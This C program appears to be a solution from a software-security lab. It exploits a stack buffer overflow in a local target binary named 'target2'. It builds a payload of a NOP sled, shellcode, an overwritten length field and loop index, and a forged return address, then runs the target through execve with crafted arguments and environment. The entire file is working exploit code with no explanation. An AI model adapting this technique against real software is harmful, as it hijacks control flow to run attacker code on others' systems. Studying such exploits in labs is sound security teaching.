#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define NOP 0x90
#define LEN_VAL 0x011C  // 284 in decimal
#define I_VAL "\x17"  // offset to RA
#define RET_ADDR "\x80\xfd\x21\x30" 

int
main ( int argc, char * argv[] )
{
	char attack_string[285];

	unsigned char len[4];
	len[0] = (LEN_VAL) & 0xFF;
	len[1] = (LEN_VAL >> 8) & 0xFF;
	len[2] = 0; 
	len[3] = 0;

	memset(attack_string, NOP, 285);
	memcpy(attack_string, shellcode, strlen(shellcode));
	memcpy(&attack_string[264], len, 4);
	memcpy(&attack_string[268], I_VAL, 1);
	memcpy(&attack_string[280], RET_ADDR, 4);
	attack_string[284] = '\0';

	char *	args[3];
	char *	env[3];

	args[0] = TARGET;
	args[1] = attack_string;
	args[2] = NULL;

	env[0] = "\x00"; // len[3]
	env[1] = &attack_string[268];
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
